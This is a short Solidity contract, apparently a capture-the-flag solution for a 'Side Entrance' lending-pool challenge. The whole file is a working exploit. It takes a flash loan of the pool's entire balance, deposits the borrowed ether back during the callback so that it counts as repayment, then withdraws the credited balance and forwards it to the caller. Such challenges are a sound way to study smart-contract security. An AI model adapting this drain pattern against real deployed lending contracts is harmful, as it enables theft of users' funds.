// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";

interface IFlashLoanEtherReceiver {
    function execute() external payable;
}

interface ISideEntranceLenderPool {
	function flashLoan(uint256) external;
	function deposit() external payable;
	function withdraw() external;
}

contract SideEntranceHack is IFlashLoanEtherReceiver {
	using Address for address payable;

	ISideEntranceLenderPool immutable pool;

	constructor(address _pool) {
		pool = ISideEntranceLenderPool(_pool);
	}

	function hack() external {
		pool.flashLoan(address(pool).balance);
		pool.withdraw();
		payable(msg.sender).sendValue(address(this).balance);
	}

	function execute() external payable override {
		pool.deposit{value: msg.value}();
	}

	receive() external payable {}
}